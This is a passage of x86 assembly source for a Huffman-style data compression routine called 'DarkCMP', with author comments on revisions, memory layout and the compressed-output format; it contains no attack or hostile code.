   ;           - we are loosing some percentages compression :(
   ;               - decompression routine size down to: about 125 bytes
   ;           - improvent for decompression speed, down to
   ;           84 microsecond for 50 Ko on a P133 !!!
   ;           (I didn't belived myself but true, 5000 Mega/sec ???)
   ;
   ; Revision 4 - Improved construction, Complete 32 bit structures
   ;       - Revised time critical procedure 1 (256 times speed up!)
   ;       - Revised time critical procedure 3 (for very large compression)
   ;       - A few bugs revised
   ;
   ; - I have to greet zombie for all his help during the writing of
   ;                                                            these routines -
   ;
   ;

   DarkCMP:

   pushad

   push    edi                                     ; saving value for compressed
                                                   ; size calculation
   mov byte ptr [edi],'h'
   mov dword ptr [edi+1],ecx           ; original size

   push    esi                                     ; saving value for later
   push    ecx

   push    edi

   lea     edi,[edi+5*256]                         ; set where we will put datas
   push    edi                 ;+4 don't worry this is
                           ;for stimulated stack
   xor     eax,eax                 ;just for coder's comprehension

   push    edi
   push    ecx                 ;+8

   xor     eax,eax                                 ; making a 1024 bytes zero
   mov     ecx,1024                                ; zone
   repz    stosb

   pop ecx                 ;-8
   pop edi

   mov ebx,4

   dictionarylookup:               ; Time Critical Revision One

   movzx   eax,byte ptr [esi]
   mul     ebx                                     ; we are building a zone of
   inc     dword ptr [edi+eax]                     ; number of frequencie
   inc     esi                                     ; we inc table+ascii*4
                                                   ; each time ascii encountered
   loop    dictionarylookup

   pop esi                 ;-4
   lea edi,[esi+1025]
   push    edi                 ;+4

   mov     ax,-1

   thendontstore:                                  ; we need to kill these that
   inc     ax                                      ; happend 0 times
   mov     byte ptr [edi],al                       ; so, put number in edi

   mov     edx,dword ptr [esi]                     ; get frequency of al
   cmp     edx,0                                   ; if zero, kill it
   je      dontstoryindicotable

   mov     dword ptr [edi+1],edx                   ; saving it
   add     edi,5                                   ; next pos in table
   cmp ax,100h
   je  dontstoryindicotable
   inc ecx
   dontstoryindicotable:
   add     esi,4                                   ; get next frequecy
   cmp     ax,100h                                 ; build it
   jne     thendontstore               ; 1024 bytes eat

   pop edi                 ;-4

   lea     esi,[edi+256*5]                         ; where we are going to
   inc     esi                                     ; put the crescendo mode
   mov     byte ptr [esi],cl                       ; but put number of entry
   inc     esi                                     ; there

   mov     eax,5                                   ; multiply it
   mul ecx

   add     esi,eax                                 ; esi will become edi
   sub     esi,5                                   ; later
   mov eax,1

   mov     ebx,ecx                                 ; ecx equal number of items
   mov edx,1

   xchg    esi,edi                                 ; here we go again

   push    edi             ; +8
   push    ecx

   setanynumber:

   buildarbitrarydictionaryloop1:          ;This operation is time critical
                                           ;as 32 bit, dunno, I will may be
   push    ecx                             ;rebuild it...
   push    esi                             ;I made a fixup for large compression

   checkforvalidone:

   xor     eax,eax                         ; start at zero

   buildarbitrarydictionaryloop:

   cmp     eax,dword ptr [esi+1]           ; if eax is bigger then bybye
   ja  thendontsetarbitrary

   mov     eax,dword ptr [esi+1]           ; we set frequency in eax as biggest
   mov     edx,esi                         ; and save his location

   thendontsetarbitrary:

   add esi,5
   loop    buildarbitrarydictionaryloop    ; it's the last of the series
                                           ;
   mov     esi,edx                         ; we get there
   movsb                                   ; saving everyhting
   movsd
   mov     dword ptr [esi-4],0             ; we set before this one to zero
                                           ; nothing is biggest than zero :)
   pop     esi
   pop ecx

   dec ebx
   cmp     ebx,0                           ; this routine eat a lot of memory...
   jne buildarbitrarydictionaryloop1   ; super highway 2561 bytes eaten

   thengotothere:

   pop ecx
   pop esi             ; -8

   pop     edx

   mov     word ptr [edx+5],cx             ; we then set in the destination
   lea     eax,[edx+7]                     ; number of entr

   push    eax

   makethree:                              ; now we make a three
                                           ; if ya don't understand, go read
                                           ; huffman compression egine
   lea edi,[esi+512*5+5]           ; +2560 bytes eaten
   lea ebp,[edi+512*5+5]           ; +1536 bytes eaten

   push    esi
   push    ebp

   mov     edx,ecx                                 ; edx contain number of
                                                   ; image in three
   untilnothree:

   push    esi
   push    edi
   push    ebp
   mov ebp,edx
   sub ebp,ecx
   push    ecx
   push    edx                                     ; saving these value for
                                                   ; completing the loop
   mov ecx,edx

   getfromthree:

   mov eax,ecx
   shl eax,2
   add     ecx,eax                         ; multiply ecx by 5

   mov edx,ebp

   mov     eax,edx                         ; multiply ecx by 5
   shl eax,2
   add edx,eax             ; gain of speed from slow mul/div...

   push    edi
   push    ecx
   repz    movsb               ; copy the buffer :]
   pop     ecx                             ; because we will operate on it
   pop edi

   xor ebp,ebp
   xor     ebx,ebx                         ; resent constants

   mov dh,byte ptr [edi+edx]
   add edi,ecx

   escalator:

   push    edi
   push    ecx

   mov     eax,dword ptr [edi+1-5]         ; we get current

   cmp     dh,byte ptr [edi-5]             ; and look if he's in the two last
   jne     thendontsetthebit               ; object of the vertical three

   inc     ebp                             ; if so, then update the current
   ror     bx,1                            ; value for horizontal three
   jmp     thendontsetthebit3              ; correspondance (shift 1 + 0)

   thendontsetthebit:

   cmp     dh,byte ptr [edi-5-5]           ; look if before the last...
   jne thendontsetthebit2

   inc ebp
   ror     bx,1
   inc     bx                              ; shif 1 + 1
   jmp thendontsetthebit3

   thendontsetthebit3:

   mov     dh,byte ptr [edi-5-5]           ;

   thendontsetthebit2:

   mov     dl,byte ptr [edi-5-5]           ; make fusion of last two entries

   add     eax,dword ptr [edi+1-5-5]       ; we get new entry

   thenputloop:

   cmp     eax,dword ptr [edi-5+1]
   jb  thenputhere

   mov     esi,dword ptr [edi-5]           ; then refix all the table with the
   mov dword ptr [edi],esi
   mov     esi,dword ptr [edi-5+1]         ; this value
   mov dword ptr [edi+1],esi

   sub edi,5
   sub     ecx,5                           ; repeat it
   cmp ecx,0
   jne     thenputloop                     ; for every value

   thenputhere:

   mov     byte ptr [edi],dl                 ; this is in case of the last
   mov     dword ptr [edi+1],eax             ; change all the substructure
   sub     edi,3                             ; of the three

   thenitsfinish:

   pop ecx
   pop edi
                                             ; this is for the loop
   sub edi,5
   sub     ecx,5
   cmp ecx,5
   jne escalator

   mov cx,bp
   dec cx
   rol bx,cl

   mov eax,ebp

   pop     edx                                     ; restore datas
   pop ecx
   pop ebp
   pop edi
   pop esi

   mov     byte ptr [ebp],al                       ; save this in the three
   mov word ptr [ebp+1],bx
   add ebp,3

   dec ecx
   jnz     untilnothree                            ; we have to do this for
                                                   ; each object of the three
   mov byte ptr [ebp],0

   pop     ebp                                     ; restore data for
   pop     edx                                     ; encoding

   pop edi
   pop ecx
   pop esi

   push ecx                                ; compressing a bit the corrspondance
   push edi                                ; table make it working without extra
                                           ; memory...
   movzx ecx,word ptr [edi-2]              ;

   dicotype2:              ; build a mini char/three

   mov     al,byte ptr [edx]       ; correspondance table
   mov     byte ptr [edi],al       ; even as mini, for 24 char, it take
   mov al,byte ptr [ebp]       ; 1024 caracters :(
   mov byte ptr [edi+1],al     ; blah, nobody is perfect...
   mov ax,word ptr [ebp+1]     ; now we concatenate the binary to the
   mov word ptr [edi+2],ax     ; now we concatenate the binary to the

   add edx,5
   add ebp,3
   add edi,4

   loop    dicotype2

   pop edx
   pop ecx

   mov word ptr [edi],-1                           ; this to make a stop for
                                                   ; decompressing
   inc edi
   inc edi

   mov dword ptr [edi],0                           ; set zero to there, reset
                                                   ; values
   inc edi

   compressloop:

   mov     al,byte ptr [esi]                       ; get current ascii in
                                                   ; data to be compressed
   push    ecx
   push    edx

   sub     edx,4                                   ; we have to start at zero
   scannext01:
   add edx,4

   cmp byte ptr [edx],al
   jne     scannext01                              ; loop until we get the value

   xor ecx,ecx
   mov cl,byte ptr [edx+1]
   mov dx,word ptr [edx+2]     ; now we concatenate the binary to the
   dec cl              ; buffer, [edi] = the pos of the bit of
   ror dx,cl
   inc cl

   hereweloop:

   mov ah,8
   sub ah,byte ptr [edi]       ; [edi-1]

   cmp ah,0
   jne     thennoneedofimplementation      ;look if we completed a entire 8 byte

   mov     word ptr [edi],0                ; then resent edi
   inc     edi                             ; increment it
   mov ah,8

   thennoneedofimplementation:

   dec ah
   xchg    ah,cl
   mov     al,byte ptr [edi-1]             ; we have to change edi-1
   ror     al,cl                           ; and shift it

   push    edx

   and     edx,1                           ; we look if we
   add     eax,edx                         ; need to concatenate one bit
                                           ; of the three image
   pop edx

   rol al,cl
   rol     dx,1                            ; set to next bye change

   mov     byte ptr [edi-1],al             ; store it
   inc byte ptr [edi]

   xchg    ah,cl
   inc     ah                              ; restore the position

   loop    hereweloop                      ; and then concatenate ecx eax

   pop edx
   pop     ecx                             ; then compress all the datas

   inc esi

   loop    compressloop

   pop edx

   sub     edx,edi                         ; now get size of the compressed
   neg     edx                             ; segment

   ;
   ; The memory is done such like:
   ;
   ; Off Size  Description
   ; 0 - byte      068h - (0x68) - Recognizing mark
   ; 1 - word  Original size: Dword
   ; 5 - byte  Number of tree entry
   ; 7 - entries
   ; entry (4bytes) :  - 1 byte: ascii number
   ;           - 2 byte: number of bits
   ;           - 3 word: recognition
   ; ? - word  0FFFFh - (0xFFFF) - reserved            / bug fix :P
   ; ? - ?     compressed datas                / file size
   ;

   mov dword ptr [esp+20h-4],edx
   popad                                           ; return back
   ret

   db      '[DSCEi386]'            ; Dark Side Compression Engine

   ---
